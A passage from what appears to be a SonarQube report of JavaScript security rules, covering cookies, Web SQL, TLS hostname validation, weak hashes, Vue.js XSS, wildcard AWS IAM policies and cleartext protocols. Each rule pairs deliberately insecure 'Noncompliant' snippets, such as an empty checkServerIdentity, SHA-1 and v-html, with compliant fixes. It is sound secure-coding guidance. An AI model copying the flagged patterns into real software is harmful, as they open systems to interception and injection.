  access to your Amazon S3 storage </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.BlockPublicAccess.html" rel="nofollow">AWS CDK version 2</a> - BlockPublicAccess </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S2255">
              javascript:S2255
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-11639" rel="nofollow">CVE-2018-11639</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2016-6537" rel="nofollow">CVE-2016-6537</a> </li></ul>
<p>Attackers can use widely-available tools to read cookies. Any sensitive information they may contain will be exposed.</p>
<p>This rule flags code that writes cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> sensitive information is stored inside the cookie. </li></ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the
user session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer
than the user session.</p>
<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the
original information will be exposed.</p>
<p>Using cookies only for session IDs doesn’t make them secure. Follow <a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies" rel="nofollow">OWASP best practices</a> when you configure your
cookies.</p>
<p>As a side note, every information read from a cookie should be <a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet" rel="nofollow">Sanitized</a>.</p>
<h2>Sensitive Code Example</h2>
<pre>
// &#61;&#61;&#61; Built-in NodeJS modules &#61;&#61;&#61;
const http &#61; require(&#39;http&#39;);
const https &#61; require(&#39;https&#39;);

http.createServer(function(req, res) {
  res.setHeader(&#39;Set-Cookie&#39;, [&#39;type&#61;ninja&#39;, &#39;lang&#61;js&#39;]); // Sensitive
});
https.createServer(function(req, res) {
  res.setHeader(&#39;Set-Cookie&#39;, [&#39;type&#61;ninja&#39;, &#39;lang&#61;js&#39;]); // Sensitive
});
</pre>
<pre>
// &#61;&#61;&#61; ExpressJS &#61;&#61;&#61;
const express &#61; require(&#39;express&#39;);
const app &#61; express();
app.use(function(req, res, next) {
  res.cookie(&#39;name&#39;, &#39;John&#39;); // Sensitive
});
</pre>
<pre>
// &#61;&#61;&#61; In browser &#61;&#61;&#61;
// Set cookie
document.cookie &#61; &#34;name&#61;John&#34;; // Sensitive
</pre>
<h2>See</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/312" rel="nofollow">MITRE, CWE-312</a> - Cleartext Storage of Sensitive Information </li><li> <a href="https://cwe.mitre.org/data/definitions/315" rel="nofollow">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li><li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE" rel="nofollow">COOKIE_USAGE</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S2817">
              javascript:S2817
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<h2>Why is this an issue?</h2>
<p>The Web SQL Database standard never saw the light of day. It was first formulated, then deprecated by the W3C and was only implemented in some
browsers. (It is not supported in Firefox or IE.)</p>
<p>Further, the use of a Web SQL Database poses security concerns, since you only need its name to access such a database.</p>
<h3>Noncompliant code example</h3>
<pre>
var db &#61; window.openDatabase(&#34;myDb&#34;, &#34;1.0&#34;, &#34;Personal secrets stored here&#34;, 2*1024*1024);  // Noncompliant
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5527">
              javascript:S5527
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows attackers to impersonate a trusted host.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this
process, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding
an extra layer of trust and security.</p>
<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity
and intercept, manipulate, or steal the data being transmitted.</p>
<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the
application code would still accept it.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build
this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit
this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,
tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data
your system sends to them, potentially leading to significant data breaches.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled hostname validation.</p>
<p>The hostname validation gets disabled by overriding <code>checkServerIdentity</code> with an empty implementation. It is highly recommended to use
the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const https &#61; require(&#39;node:https&#39;);

let options &#61; {
  hostname: &#39;www.example.com&#39;,
  port: 443,
  path: &#39;/&#39;,
  method: &#39;GET&#39;,
  checkServerIdentity: function() {}, // Noncompliant
  secureProtocol: &#39;TLSv1_2_method&#39;
};

let req &#61; https.request(options, (res) &#61;&gt; {
  res.on(&#39;data&#39;, (d) &#61;&gt; {
    process.stdout.write(d);
  });
});
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
const tls &#61; require(&#39;node:tls&#39;);

let options &#61; {
  checkServerIdentity: function() {}, // Noncompliant
  secureProtocol: &#39;TLSv1_2_method&#39;
};

let socket &#61; tls.connect(443, &#34;www.example.com&#34;, options, () &#61;&gt; {
  process.stdin.pipe(socket);
  process.stdin.resume();
});
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const https &#61; require(&#39;node:https&#39;);

let options &#61; {
  hostname: &#39;www.example.com&#39;,
  port: 443,
  path: &#39;/&#39;,
  method: &#39;GET&#39;,
  secureProtocol: &#39;TLSv1_2_method&#39;
};

let req &#61; https.request(options, (res) &#61;&gt; {
  res.on(&#39;data&#39;, (d) &#61;&gt; {
    process.stdout.write(d);
  });
});
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
const tls &#61; require(&#39;node:tls&#39;);

let options &#61; {
  secureProtocol: &#39;TLSv1_2_method&#39;
};

let socket &#61; tls.connect(443, &#34;www.example.com&#34;, options, () &#61;&gt; {
  process.stdin.pipe(socket);
  process.stdin.resume();
});
</pre>
<h3>How does this work?</h3>
<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root
cause: the validity of the certificate.</p>
<h4>Use valid certificates</h4>
<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around
another system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>
<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,
consider replicating its service to a server whose certificate you can change yourself.</p>
<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>
<ul><li> Create a self-signed certificate for that machine. </li><li> Add this self-signed certificate to the system’s trust store. </li><li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li></ul>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://cwe.mitre.org/data/definitions/297" rel="nofollow">MITRE, CWE-297</a> - Improper Validation of Certificate with Host Mismatch </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4790">
              javascript:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul><li> User-password storage. </li><li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li><li> To compute some message integrity. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too &#34;quickly&#34;, like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
const crypto &#61; require(&#34;crypto&#34;);

const hash &#61; crypto.createHash(&#39;sha1&#39;); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
const crypto &#61; require(&#34;crypto&#34;);

const hash &#61; crypto.createHash(&#39;sha512&#39;); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/1240" rel="nofollow">MITRE, CWE-1240</a> - Use of a Risky Cryptographic Primitive </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6299">
              javascript:S6299
            </a>
          </td>
          <td>
            <details>
              <p>Vue.js framework prevents XSS vulnerabilities by automatically escaping HTML contents with the use of native API browsers like
<code>innerText</code> instead of <code>innerHtml</code>.</p>
<p>It’s still possible to explicity use <code>innerHtml</code> and similar APIs to render HTML. Accidentally rendering malicious HTML data will
introduce an XSS vulnerability in the application and enable a wide range of serious attacks like accessing/modifying sensitive information or
impersonating other users.</p>
<h2>Ask Yourself Whether</h2>
<p>The application needs to render HTML content which:</p>
<ul><li> could be user-controlled and not previously sanitized. </li><li> is difficult to understand how it was constructed. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Avoid injecting HTML content with <code>v-html</code> directive unless the content can be considered 100% safe, instead try to rely as much as
  possible on built-in auto-escaping Vue.js features. </li><li> Take care when using the <code>v-bind:href</code> directive to set URLs which can contain malicious Javascript
  (<code>javascript:onClick(...)</code>). </li><li> Event directives like <code>:onmouseover</code> are also prone to Javascript injection and should not be used with unsafe values. </li></ul>
<h2>Sensitive Code Example</h2>
<p>When using Vue.js templates, the <code>v-html</code> directive enables HTML rendering without any sanitization:</p>
<pre>
&lt;div v-html&#61;&#34;htmlContent&#34;&gt;&lt;/div&gt; &lt;!-- Noncompliant --&gt;
</pre>
<p>When using a rendering function, the <code>innerHTML</code> attribute enables HTML rendering without any sanitization:</p>
<pre>
Vue.component(&#39;element&#39;, {
  render: function (createElement) {
    return createElement(
      &#39;div&#39;,
      {
        domProps: {
          innerHTML: this.htmlContent, // Noncompliant
        }
      }
    );
  },
});
</pre>
<p>When using JSX, the <code>domPropsInnerHTML</code> attribute enables HTML rendering without any sanitization:</p>
<pre>
&lt;div domPropsInnerHTML&#61;{this.htmlContent}&gt;&lt;/div&gt; &lt;!-- Noncompliant --&gt;
</pre>
<h2>Compliant Solution</h2>
<p>When using Vue.js templates, putting the content as a child node of the element is safe:</p>
<pre>
&lt;div&gt;{<!-- -->{ htmlContent }}&lt;/div&gt;
</pre>
<p>When using a rendering function, using the <code>innerText</code> attribute or putting the content as a child node of the element is safe:</p>
<pre>
Vue.component(&#39;element&#39;, {
  render: function (createElement) {
    return createElement(
      &#39;div&#39;,
      {
        domProps: {
          innerText: this.htmlContent,
        }
      },
      this.htmlContent // Child node
    );
  },
});
</pre>
<p>When using JSX, putting the content as a child node of the element is safe:</p>
<pre>
&lt;div&gt;{this.htmlContent}&lt;/div&gt;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li><li> <a href="https://vuejs.org/v2/guide/security.html#Injecting-HTML" rel="nofollow">Vue.js - Security - Injecting HTML</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6304">
              javascript:S6304
            </a>
          </td>
          <td>
            <details>
              <p>A policy that allows identities to access all resources in an AWS account may violate <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege" rel="nofollow">the principle of least privilege</a>. Suppose an identity has permission to access
all resources even though it only requires access to some non-sensitive ones. In this case, unauthorized access and disclosure of sensitive
information will occur.</p>
<h2>Ask Yourself Whether</h2>
<p>The AWS account has more than one resource with different levels of sensitivity.</p>
<p>A risk exists if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to apply the least privilege principle, i.e., by only granting access to necessary resources. A good practice to achieve this is
to organize or <a href="https://aws.amazon.com/blogs/security/simplify-granting-access-to-your-aws-resources-by-using-tags-on-aws-iam-users-and-roles/" rel="nofollow">tag</a>
resources depending on the sensitivity level of data they store or process. Therefore, managing a secure access control is less prone to errors.</p>
<h2>Sensitive Code Example</h2>
<p>The wildcard <code>&#34;*&#34;</code> is specified as the resource for this <code>PolicyStatement</code>. This grants the update permission for all
policies of the account:</p>
<pre>
import { aws_iam as iam } from &#39;aws-cdk-lib&#39;

new iam.PolicyDocument({
    statements: [
        new iam.PolicyStatement({
            effect: iam.Effect.ALLOW,
            actions: [&#34;iam:CreatePolicyVersion&#34;],
            resources: [&#34;*&#34;] // Sensitive
        })
    ]
})
</pre>
<h2>Compliant Solution</h2>
<p>Restrict the update permission to the appropriate subset of policies:</p>
<pre>
import { aws_iam as iam } from &#39;aws-cdk-lib&#39;

new iam.PolicyDocument({
    statements: [
        new iam.PolicyStatement({
            effect: iam.Effect.ALLOW,
            actions: [&#34;iam:CreatePolicyVersion&#34;],
            resources: [&#34;arn:aws:iam:::policy/team1/*&#34;]
        })
    ]
})
</pre>
<h2>Exceptions</h2>
<ul><li> Should not be raised on key policies (when AWS KMS actions are used.) </li><li> Should not be raised on policies not using any resources (if and only if all actions in the policy never require resources.) </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege" rel="nofollow">AWS Documentation</a> - Grant least
  privilege </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5332">
              javascript:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul><li> sensitive data exposure </li><li> traffic redirected to a malicious endpoint </li><li> malware-infected software update or installer </li><li> execution of client-side code </li><li> corruption of critical information </li></ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul><li> bypassing isolation mechanisms </li><li> compromising a component of the network </li><li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li></ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http" rel="nofollow">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169" rel="nofollow">CVE-2019-6169</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327" rel="nofollow">CVE-2019-12327</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065" rel="nofollow">CVE-2019-11065</a> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li><li> Application data transits over an untrusted network. </li><li> Compliance rules require the service to encrypt data in transit. </li><li> Your application renders web pages with a relaxed mixed content policy. </li><li> OS-level protections against clear-text traffic are deactivated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul><li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li><li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li><li> Use <code>https</code> instead of <code>http</code>. </li><li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li></ul>  </li><li> Enable encryption of cloud components communications whenever it is possible. </li><li> Configure your application to block mixed content when rendering web pages. </li><li> If available, enforce OS-level deactivation of all clear-text traffic. </li></ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<pre>
url &#61; &#34;http://example.com&#34;; // Sensitive
url &#61; &#34;ftp://anonymous&#64;example.com&#34;; // Sensitive
url &#61; &#34;telnet://anonymous&#64;example.com&#34;; // Sensitive
</pre>
<p>For <a href="https://nodemailer.com" rel="nofollow">nodemailer</a>:</p>
<pre>
const nodemailer &#61; require(&#34;nodemailer&#34;);
let transporter &#61; nodemailer.createTransport({
  secure: false, // Sensitive
  requireTLS: false // Sensitive
});
</pre>
<pre>
const nodemailer &#61; require(&#34;nodemailer&#34;);
let transporter &#61; nodemailer.createTransport({}); // Sensitive
</pre>
<p>For <a href="https://github.com/mscdex/node-ftp" rel="nofollow">ftp</a>:</p>
<pre>
var Client &#61; require(&#39;ftp&#39;);
var c &#61; new Client();
c.connect({
  &#39;secure&#39;: false // Sensitive
});
</pre>
<p>For <a href="https://github.com/mkozjak/node-telnet-client" rel="nofollow">telnet-client</a>:</p>
<pre>
const Telnet &#61; require(&#39;telnet-client&#39;); // Sensitive
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationLoadBalancer.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationLoadBalancer</a>:</p>
<pre>
import { ApplicationLoadBalancer } from &#39;aws-cdk-lib/aws-elasticloadbalancingv2&#39;;

const alb &#61; new ApplicationLoadBalancer(this, &#39;ALB&#39;, {
  vpc: vpc,
  internetFacing: true
});

alb.addListener(&#39;listener-http-default&#39;, {
  port: 8080,
  open: true
}); // Sensitive

alb.addListener(&#39;listener-http-explicit&#39;, {
  protocol: ApplicationProtocol.HTTP, // Sensitive
  port: 8080,
  open: true
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationListener.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationListener</a>:</p>
<pre>
import { ApplicationListener } from &#39;aws-cdk-lib/aws-elasticloadbalancingv2&#39;;

new ApplicationListener(this, &#39;listener-http-explicit-constructor&#39;, {
  loadBalancer: alb,
  protocol: ApplicationProtocol.HTTP, // Sensitive
  port: 8080,
  open: true
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkLoadBalancer.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkLoadBalancer</a>:</p>
<pre>
import { NetworkLoadBalancer } from &#39;aws-cdk-lib/aws-elasticloadbalancingv2&#39;;

const nlb &#61; new NetworkLoadBalancer(this, &#39;nlb&#39;, {
  vpc: vpc,
  internetFacing: true
});

var listenerNLB &#61; nlb.addListener(&#39;listener-tcp-default&#39;, {
  port: 1234
}); // Sensitive

listenerNLB &#61; nlb.addListener(&#39;listener-tcp-explicit&#39;, {
  protocol: Protocol.TCP, // Sensitive
  port: 1234
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkListener.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkListener</a>:</p>
<pre>
import { NetworkListener } from &#39;aws-cdk-lib/aws-elasticloadbalancingv2&#39;;

new NetworkListener(this, &#39;listener-tcp-explicit-constructor&#39;, {
  loadBalancer: nlb,
  protocol: Protocol.TCP, // Sensitive
  port: 8080
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.CfnListener.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancingv2.CfnListener</a>:</p>
<pre>
import { CfnListener } from &#39;aws-cdk-lib/aws-elasticloadbalancingv2&#39;;

new CfnListener(this, &#39;listener-http&#39;, {
  defaultActions: defaultActions,
  loadBalancerArn: alb.loadBalancerArn,
  protocol: &#34;HTTP&#34;, // Sensitive
  port: 80
});

new CfnListener(this, &#39;listener-tcp&#39;, {
  defaultActions: defaultActions,
  loadBalancerArn: alb.loadBalancerArn,
  protocol: &#34;TCP&#34;, // Sensitive
  port: 80
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.CfnLoadBalancer.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancing.CfnLoadBalancer</a>:</p>
<pre>
import { CfnLoadBalancer } from &#39;aws-cdk-lib/aws-elasticloadbalancing&#39;;

new CfnLoadBalancer(this, &#39;elb-tcp&#39;, {
  listeners: [{
    instancePort: &#39;1000&#39;,
    loadBalancerPort: &#39;1000&#39;,
    protocol: &#39;tcp&#39; // Sensitive
  }]
});

new CfnLoadBalancer(this, &#39;elb-http&#39;, {
  listeners: [{
    instancePort: &#39;1000&#39;,
    loadBalancerPort: &#39;1000&#39;,
    protocol: &#39;http&#39; // Sensitive
  }]
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.LoadBalancer.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancing.LoadBalancer</a>:</p>
<pre>
import { LoadBalancer } from &#39;aws-cdk-lib/aws-elasticloadbalancing&#39;;

const loadBalancer &#61; new LoadBalancer(this, &#39;elb-tcp-dict&#39;, {
    vpc,
    internetFacing: true,
    healthCheck: {
    port: 80,
    },
    listeners: [
    {
        externalPort:10000,
        externalProtocol: LoadBalancingProtocol.TCP, // Sensitive
        internalPort:10000
    }]
});

loadBalancer.addListener({
  externalPort:10001,
  externalProtocol:LoadBalancingProtocol.TCP, // Sensitive
  internalPort:10001
});
loadBalancer.addListener({
  externalPort:10002,
  externalProtocol:LoadBalancingProtocol.HTTP, // Sensitive
  internalPort:10002
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticache.CfnReplicationGroup.html" rel="nofollow">aws-cdk-lib.aws-elasticache.CfnReplicationGroup</a>:</p>
<pre>
import { CfnReplicationGroup } from &#39;aws-cdk-lib/aws-elasticache&#39;;

new CfnReplicationGroup(this, &#39;unencrypted-implicit&#39;, {
  replicationGroupDescription: &#39;exampleDescription&#39;
}); // Sensitive

new CfnReplicationGroup(this, &#39;unencrypted-explicit&#39;, {
  replicationGroupDescription: &#39;exampleDescription&#39;,
  transitEncryptionEnabled: false // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.CfnStream.html" rel="nofollow">aws-cdk-lib.aws-kinesis.CfnStream</a>:</p>
<pre>
import { CfnStream } from &#39;aws-cdk-lib/aws-kinesis&#39;;

new CfnStream(this, &#39;cfnstream-implicit-unencrytped&#39;, undefined); // Sensitive

new CfnStream(this, &#39;cfnstream-explicit-unencrytped&#39;, {
  streamEncryption: undefined // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.Stream.html" rel="nofollow">aws-cdk-lib.aws-kinesis.Stream</a>:</p>
<pre>
import { Stream } from &#39;aws-cdk-lib/aws-kinesis&#39;;

new Stream(this, &#39;stream-explicit-unencrypted&#39;, {
  encryption: StreamEncryption.UNENCRYPTED // Sensitive
});
</pre>
<h2>Compliant Solution</h2>
<pre>
url &#61; &#34;https://example.com&#34;;
url &#61; &#34;sftp://anonymous&#64;example.com&#34;;
url &#61; &#34;ssh://anonymous&#64;example.com&#34;;
</pre>
<p>For <a href="https://nodemailer.com" rel="nofollow">nodemailer</a> one of the following options must be set:</p>
<pre>
const nodemailer &#61; require(&#34;nodemailer&#34;);
let transporter &#61; nodemailer.createTransport({
  secure: true,
  requireTLS: true,
  port: 465,
  secured: true
});
</pre>
<p>For <a href="https://github.com/mscdex/node-ftp" rel="nofollow">ftp</a>:</p>
<pre>
var Client &#61; require(&#39;ftp&#39;);
var c &#61; new Client();
c.connect({
  &#39;secure&#39;: true
});
</pre>
